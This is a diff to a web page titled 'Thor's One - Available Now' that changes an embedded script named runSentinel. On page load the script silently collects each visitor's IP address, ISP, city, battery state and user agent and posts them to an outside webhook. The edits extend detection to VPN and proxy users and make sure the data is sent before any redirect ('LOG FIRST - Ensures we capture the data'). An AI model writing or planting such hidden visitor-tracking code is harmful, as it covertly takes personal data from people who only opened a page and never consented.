@@ -147,23 +147,27 @@ title: Thor's One - Available Now
             
             const isMaster = absoluteMasters.includes(geo.ip);
             const isWichita = geo.ip === wichitaIP;
-            const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply/i.test(geo.org);
+            const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply|VPN|Proxy/i.test(geo.org);
 
+            // 1. SELECT STATUS & COLOR
             let status = "🚨 INTEL SCAN";
-            let color = 15548997; 
+            let color = 15548997; // Red
 
             if (isMaster) {
                 status = "👑 MASTER ACCESS";
-                color = 15844367; 
+                color = 15844367; // Gold
             } else if (isWichita) {
                 status = "🌾 WICHITA NODE REPORT";
-                color = 3447003; 
+                color = 3447003; // Blue
+            } else if (isCloud) {
+                status = "☁️ CLOAKED / VPN DETECTED";
+                color = 10181046; // Purple
             }
 
             const report = {
                 username: isMaster ? "THORS-RIG-ADMIN" : "SENTINEL-INTELLIGENCE",
                 embeds: [{
-                    title: `${status}: ${geo.city}`,
+                    title: `${status}: ${geo.city || "Unknown Node"}`,
                     color: color,
                     fields: [
                         { name: "🌐 Network", value: `IP: ${geo.ip}\nISP: ${geo.org}`, inline: false },
@@ -172,17 +176,26 @@ title: Thor's One - Available Now
                         { name: "🔋 Battery", value: `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`, inline: true },
                         { name: "🕵️ UA", value: navigator.userAgent }
                     ],
-                    footer: { text: "McLaren Valhalla Systems // Deep Scan Active" },
+                    footer: { text: "McLaren Valhalla Systems // Sentinel Active" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
+            // 2. LOG FIRST - Ensures we capture the data
+            await fetch(hook, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(report) 
+            });
 
+            // 3. SECURE REDIRECT (Optional)
             if (isCloud && !isMaster && !isWichita) {
-                window.location.replace("https://www.google.com/search?q=unauthorized+access+detected");
+                console.warn("VPN Detected. Monitoring session.");
+                // window.location.replace("https://www.google.com"); 
             }
-        } catch (e) {}
+        } catch (e) {
+            console.error("Sentinel Error: ", e);
+        }
     }
     runSentinel();
 </script>
